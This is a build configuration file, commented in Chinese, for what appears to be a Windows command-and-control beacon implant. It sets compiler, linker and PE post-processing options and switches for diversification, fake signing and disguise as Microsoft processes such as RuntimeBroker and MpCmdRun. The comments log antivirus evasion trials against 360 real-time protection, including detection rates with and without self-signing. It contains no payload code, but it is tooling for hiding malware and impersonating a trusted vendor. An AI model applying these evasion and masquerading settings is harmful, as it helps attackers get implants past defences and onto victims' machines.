# ===== beacon 构建配置单一真相源 =====
# 改这里，全链路（对象编译 src_beacon/Makefile + config.cpp/链接/后处理 pl_main.go）自动生效。
# 消费方：src_beacon/Makefile（include）、pl_main.go（go:embed + parseBuildEnv）。
# beacon 源码（src_beacon/beacon/*.cpp）不受此文件影响——只改"二进制长什么样"。

# --- L1 编译层 ---
BEACON_CC_X64 := x86_64-w64-mingw32-g++
BEACON_CC_X86 := i686-w64-mingw32-g++
BEACON_OPTIM  := -O2
# 公共编译 flag（对象 + config.cpp + diversify.c 共用；不含 -c，pl_main.go 自加）
BEACON_CFLAGS := $(BEACON_OPTIM) -fno-lto -fno-unroll-loops -fno-rtti -fno-unwind-tables -fno-strict-aliasing -fno-threadsafe-statics -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -falign-labels=1 -fms-extensions -w
# 链接 flag
BEACON_LDFLAGS := $(BEACON_OPTIM) -fno-lto -s -Wl,-s,--gc-sections,--exclude-libs,ALL -static-libstdc++ -mwindows

# --- L1 行为开关 ---
BEACON_IAT_HIDING_DEFAULT := false

# --- L2 多样化层 ---
BEACON_DIVERSIFY := true

# --- L4 PE 后处理层 ---
BEACON_PE_HEADER_MOD := true
# --no-rich：伪造的 MSVC Rich 头在 MinGW 链接的二进制上本身就是异常（prodid 是 VS6
# 时代表、四个工具共用一个 build 号），而且它从 0x40 写入会把 GNU ld 生成的 DOS stub
# 串从中间劈开，只留一段 "mode.\r\r\n$" 尾巴。实测 5 个真微软二进制 5/5 都有完整
# stub 串、都没有这种残段。关掉之后二进制回到「普通 MinGW 程序」的样子。
BEACON_PE_MOD_FLAGS := --subsystem 2 --no-rich --no-fake-sections --no-ep-trampoline --no-fake-cert --no-shuffle-dirs --no-rename-sections --no-normalize

# --- L5 资源/签名层 ---
# ★ 2026-09-21 实测改为 false：自签名 Authenticode 会把产物直接推进查杀。
#   单变量对照（360 实时防护，每轮带良性 MinGW 对照确认天平未漂）：
#     开签名 0/12 过   关签名 7/9 过
#   且与证书主体**无关** —— 换成中性厂商 DN（不冒充微软）一样 0/3。
#   挂的是"自签名"这件事本身，所以别指望换主体能救。
#   想开回来：控制台/Web 的「Exe 伪 Authenticode 签名」勾上即可（三态开关，显式勾选优先）。
BEACON_PSEUDO_SIGN := false
# 产物伪装成正常 Windows 程序（文件名 + 版本信息 + 签名主体三处同源）。
# true  = 冒充微软自家组件（RuntimeBroker / smartscreen / MpCmdRun …）
# false = 中性身份（虚构厂商 Northwind + 通用进程名），不冒充任何真实厂商
# ★ 实证未定：伪装从上线起就一直开着，**从未被单独验证**过。
#   可疑点在于"自称微软 Defender 组件、却不是微软签的"这个组合本身就是强特征；
#   改默认值前请在干净环境用 qvm_matrix.py 做对照。
BEACON_DISGUISE := true
